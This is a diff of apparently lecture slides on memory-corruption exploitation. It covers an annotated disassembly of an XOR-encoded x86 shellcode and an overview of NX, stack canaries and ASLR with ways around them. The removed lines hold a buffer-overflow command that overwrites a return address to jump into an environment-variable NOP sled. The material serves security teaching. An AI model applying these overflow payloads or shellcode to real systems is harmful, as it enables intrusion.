@@ -7,9 +7,11 @@ class: center, middle
 # Agenda
 
 1. Classic techniques
-2. Shellcoding
-3. Protection schemes
-4. Advanced techniques
+2. Buffer Overflow example
+3. Integer Overflow example
+4. Shellcoding example
+5. Protection schemes
+6. Bypassing protections
 
 ---
 
@@ -255,11 +257,11 @@ buffer(object[, offset[, size]])
 #### Description
 
 > The object argument must be an object that supports the buffer call interface (such as strings, arrays, and buffers).
-> 
+>
 > A *new buffer object will be created* which *references the object argument*.
-> 
+>
 > The buffer object will be a slice from the beginning of object (or from the specified offset).
-> 
+>
 > The slice will extend to the end of object (or *will have a length given by the size argument*).
 
 #### Notes
@@ -341,25 +343,96 @@ diff --git a/Objects/bufferobject.c b/Objects/bufferobject.c
 
 ---
 
-## Shellcoding [1/3: analysis]
+## Shellcoding [1/2: analysis]
 
-![crypt\_shellcode](crypt_shellcode.png)
+```objdump-c
+0:   29 c9                  sub    %ecx,%ecx
+2:   74 14                  je     0x18
+4:   5e                     pop    %esi
+5:   b1 14                  mov    $0x14,%cl
+7:   46                     inc    %esi
+8:   8b 06                  mov    (%esi),%eax
+a:   83 e8 09               sub    $0x9,%eax
+d:   34 9f                  xor    $0x9f,%al
+f:   32 46 ff               xor    -0x1(%esi),%al
+12:  88 06                  mov    %al,(%esi)
+14:  e2 f1                  loop   0x7
+16:  eb 05                  jmp    0x1d
+18:  e8 e7 ff ff ff         call   0x4
+1d:  31 70 aa               xor    %esi,-0x56(%eax)
+20:  92                     xchg   %eax,%edx
+21:  d7                     xlat   %ds:(%ebx)
+22:  2d ce af e1 a8         sub    $0xa8e1afce,%eax
+27:  cc                     int3
+28:  8d a8 e1 db 9d a1      lea    -0x5e62241f(%eax),%ebp
+2e:  81                     .byte  0x81
+2f:  fe                     (bad)  
+30:  ba                     .byte  0xba
+31:  db                     .byte  0xdb
+```
 
 ???
 
+## Initial notes
+
+- What I will say *depends on the architecture*, in this case: `x86`
+  - `x86_64` (commonly used in modern PCs) is similar but with small
+    differences, e.g. first argument is not pushed into the stack.
+  - `arm` (commonly used in smartphones and embedded devices) is a lot
+    different.
+- If you have doubts, take a look at the Intel Developer Manual
+
+## Introduction
+
+- This is a shellcode (*explain what a shellcode is*)
+  - *Code is data*
+  - We can *inject code as data*
+  - There is no distinction between "normal data" and "code"
+    - This is not entirely true, e.g. `W^X` bit, *memory segments*, etc
+- This is a particular shellcode
+
+## Initial analysis
+
+- How is flow control (high level view)
+- There isn't a shellcode, I don't see `/bin/sh`, wtf???
+
 ## Analysis
 
-- `74 cb` -> `JE rel8`: Jump short if equal (`ZF = 1`)
-  - `rel8` is a *signed offset* relative to the current `EIP`
-- `e2 cb` -> `LOOP rel8`: Decrement `count`; jump short if `count != 0`
-  - `ECX` is the initial value of the counter
-  - Each time the `LOOP` instruction is executed, the count register is
-    decremented, then checked for `0`:
-    - If `count != 0`: the loop is *terminated* and program execution
-      continues with the instruction following the `LOOP` instruction
-    - If `count == 0`: a *near jump* is performed to the destination operand
-      (considered as a *signed offset* relative to the current `EIP`),
-      which is presumably the instruction at the beginning of the loop
+- `29c9`: Initialize register `ecx` to `0` and (as side effect) set `ZF` to `1`
+
+- `7414`: Jump `0x14 = 20` bytes below
+  - `74 cb` -> `JE rel8`: Jump short if equal (`ZF = 1`)
+    - `rel8` is a *signed offset* relative to the current `EIP`
+
+- `e8e7ffffff`: Call near to relative offset: `0xffffffe7`
+  - The offset is in *two's complement*:
+    ```
+    (bin)       1111 .... 1111 1110 0111
+    (hex)        f   ....  f    e    7
+    NOT (bin):  0000 .... 0000 0001 1000 +
+    SUM ONE:                           1 =
+    (bin)       0000 .... 0000 0001 1001
+    (hex):       0   ....  0    1    9   -> 0x19   
+    ```
+    - It is `0x19` bytes *above*
+    - Relative to the *next* address, i.e. `0x405`
+    - Computed call address is: `0x405 - 0x19 = 0x3ec`
+  - `EIP` is pushed in the stack, so the `ESP` points to the next instruction
+    after the `call` instruction
+
+- `3246ff`: Consider the next instruction (the instruction opcode is hold by
+  the register `al`)
+
+- `e2f1`: Perform loop
+  - `e2 cb` -> `LOOP rel8`: Decrement `count`; jump short if `count != 0`
+    - `ECX` is the initial value of the counter
+    - Each time the `LOOP` instruction is executed, the count register is
+      decremented, then checked for `0`:
+      - If `count != 0`: the loop is *terminated* and program execution
+        continues with the instruction following the `LOOP` instruction
+      - If `count == 0`: a *near jump* is performed to the destination operand
+        (considered as a *signed offset* relative to the current `EIP`),
+        which is presumably the instruction at the beginning of the loop
 
 ## Notes
 
@@ -368,7 +441,7 @@ diff --git a/Objects/bufferobject.c b/Objects/bufferobject.c
 
 ---
 
-## Shellcoding [2/3: analysis]
+## Shellcoding [2/2]
 
 ```python
 # 1. NOP sledge
@@ -388,48 +461,24 @@ diff --git a/Objects/bufferobject.c b/Objects/bufferobject.c
 "\xdb"
 ```
 
+You can try it at: [adv_exp_tec/shellcode.c]()
+
 .footnote[shellcodes database @ [shell-storm.org](http://shell-storm.org)]
 
 ---
 
-## Shellcoding [2/3: craft]
+## Protection schemes
 
-```shellsession
-_sc=$(python2 -c "print('\x90' * 1000 + '...')")
-                              ^           ^
-                         nop sledge   shellcode
-
-./sbof $(python2 -c "print('A'*4 + '\xEF\xBE\xDE\xAD' + '\x40\xf5\xff\xbf')")
-                              ^             ^                    ^
-                            buffer       OLD EBP              OLD EIP
-```
-
-ᕙ(⇀‸↼‶)ᕗ
-
-???
-
-## Questions
-
-- Why we use environment variables?
-  - We have a lot of space available,
-    we usually don't have much space in the stack
-  - Writable
-  - Easy to manipulate from caller (shell)
-
----
-
-## Stack protections
-
-- **Non-Executable Stack** (**NES**): `NX` bit
+- **Non-Executable Stack** (**NES**): `NX` bit.
 - **Randomization**:
   - **Stack Canaries**:
-    Place a randomly chosen small integer at program start
-    and check it won't be overwritten
+    Place a randomly chosen small integer at program start and check it won't
+    be overwritten.
   - **ASLR**
 
 ---
 
-## Advanced techniques
+## Bypassing protections
 
 We need to bypass NES / ASLR / Stack Canaries..
 
@@ -437,36 +486,24 @@ We need to bypass NES / ASLR / Stack Canaries..
 
 ## Bypass NES
 
-- RTL: Return to library
-- ROP: Return-Oriented Programming
-
----
-
-## RTL
-
-TODO
-
----
-
-## ROP
-
-TODO
+- **RTL**: Return to library
+- **ROP**: Return-Oriented Programming
 
 ---
 
 ## Bypass stack canaries
 
-- Biggest flaw: they only protect stack
+- Biggest flaw: they *only* protect stack
 
 - Works well on Linux
-- On Windows they can be usually bypassed with SEH
-  (Structured Exception Handler) techniques
+- On Windows they can be usually bypassed with **SEH**
+  (**Structured Exception Handler**) techniques
 
 - Cannot prevent:
-  - Heap overflow
-  - Format string vulnerabilities
-  - Double free
+  - *Heap overflow*
+  - *Format string* vulnerabilities
+  - *Double free*
 
-- Weak implementations (non-random) make the cookie easy to guess
-- Even if there are strong implementations, attacks to reduce system entropy
+- *Weak implementations* (non-random) make the cookie easy to guess
+- Even if there are strong implementations, attacks to *reduce system entropy*
   make the cookie easy to guess
